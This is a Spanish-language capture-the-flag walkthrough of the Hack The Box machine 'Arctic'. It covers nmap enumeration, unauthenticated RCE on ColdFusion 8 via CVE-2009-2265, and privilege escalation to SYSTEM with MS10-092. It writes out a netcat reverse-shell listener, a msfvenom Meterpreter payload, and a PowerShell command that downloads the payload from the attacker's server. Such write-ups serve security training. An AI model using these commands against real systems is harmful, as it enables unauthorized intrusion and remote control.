---
title: Arctic
parent: Easy
nav_order: 2
---

# Walkthrough — Arctic (Hack The Box)
{: .fs-9 }

> En esta máquina se explota un servidor ColdFusion vulnerable para obtener ejecución remota de comandos, seguido de una escalada de privilegios usando un payload de Meterpreter y la explotación local MS10-092.
{: .fs-6 .fw-300 }

---

![0](/assets/images/arctic/0.png)

Realicé un escaneo de puertos con nmap hacia la IP `10.129.189.6` para identificar servicios expuestos. El resultado mostró que los puertos 135 (msrpc), 8500 (posiblemente relacionado con fhttp o alguna app web), y el 49154 estaban abiertos. Esto me dio un punto de partida para continuar con la enumeración más enfocada en esos servicios.

```bash
nmap -p- 10.129.189.6
```

---

![1](/assets/images/arctic/1.png)

Después de identificar los puertos abiertos, realicé un escaneo más detallado con Nmap usando los scripts por defecto y detección de versiones sobre los puertos 135, 8500 y 49154. El resultado confirmó que la máquina corre Windows, con servicios RPC en los puertos 135 y 49154, y un servidor JRun Web Server en el puerto 8500 que muestra un simple Index of /, lo cual sugiere que podría haber directorios o archivos expuestos que vale la pena revisar.

```bash
nmap -p 135,8500,49154 -sC -sV 10.129.189.6
```

---

![2](/assets/images/arctic/2.png)

Al abrir el puerto 8500 en el navegador, me encontré con un listado de directorios: `/CFIDE` y `/cfdocs`.

---

![3](/assets/images/arctic/3.png)

Entrando a `/CFIDE/administrator`, aparece el panel de administración de ColdFusion 8. Confirmado: es vulnerable. Buscando un poco encontré el exploit CVE-2009-2265, que permite RCE sin autenticación. Toca preparar el exploit. En esta caso, usé el siguiente exploit:  
https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265/blob/master/README.md

---

![4](/assets/images/arctic/4.png)

Aquí preparo un listener con Netcat en el puerto 4444, esperando que la víctima se conecte con una reverse shell. Esta conexión se iniciará cuando ejecute el exploit en la máquina objetivo.

```bash
nc -lnvp 4444
```

---

![5](/assets/images/arctic/5.png)

Ejecuto el exploit contra ColdFusion y espero hasta tener respuestas.

```bash
./rce -l 10.10.14.178 -p 4444 -r 10.129.189.6 -q 8500
```

---

![6](/assets/images/arctic/6.png)

Directamente ya tenemos acceso al usuario.

---

![7](/assets/images/arctic/7.png)

## Escalada de privilegios

Aquí genero un ejecutable malicioso (`met_shell.exe`) usando msfvenom. El payload es una reverse shell con Meterpreter, que al ejecutarse desde la máquina víctima se conectará de vuelta a mi IP (10.10.14.178) por el puerto 8500.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.178 LPORT=8500 -f exe > met_shell.exe
```

---

![8](/assets/images/arctic/8.png)

Después de generar el payload, levanto un servidor HTTP en el puerto 8080 para poder compartir el archivo met_shell.exe con la máquina víctima.

---

![9](/assets/images/arctic/9.png)

Configuro un listener en Metasploit con el mismo payload y parámetros que usé al generar el met_shell.exe con msfvenom. Este handler se queda escuchando en mi máquina para capturar la reverse shell que se lanzará desde la víctima al ejecutar el payload.

---

![10](/assets/images/arctic/10.png)

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.178:8080/met_shell.exe','meterpreter.exe')"
```

Una vez descargado, ejecuto el payload. Esto lanza una conexión inversa (reverse shell) desde la máquina víctima a mi listener de Metasploit, dándome una sesión Meterpreter completamente funcional.

---

![11](/assets/images/arctic/11.png)

---

![12](/assets/images/arctic/12.png)

Después de obtener la sesión con Meterpreter, la pasé a segundo plano (background) y ejecuté el módulo local_exploit_suggester.  
Este módulo analiza el sistema operativo de la máquina víctima (en este caso, Windows Server 2008 R2 sin SP1) y sugiere posibles exploits locales para escalar privilegios.

---

![13](/assets/images/arctic/13.png)

Tras ver que MS10-092 estaba entre los exploits sugeridos, lo seleccioné directamente desde Metasploit. Este exploit intenta aprovechar una vulnerabilidad en el programador de tareas de Windows para ejecutar código con privilegios de SYSTEM.

---

![14](/assets/images/arctic/14.png)

Listo, en mi caso llegar aquí ha sido algo más duro ya que la máquina se quedaba congelada y tenía que reiniciarla.  
Pero al final ya tenemos acceso root.

---

![15](/assets/images/arctic/15.png)

**Autor:** [gueco99](https://github.com/gueco99)  
Hack the Box – *Arctic* (Easy)
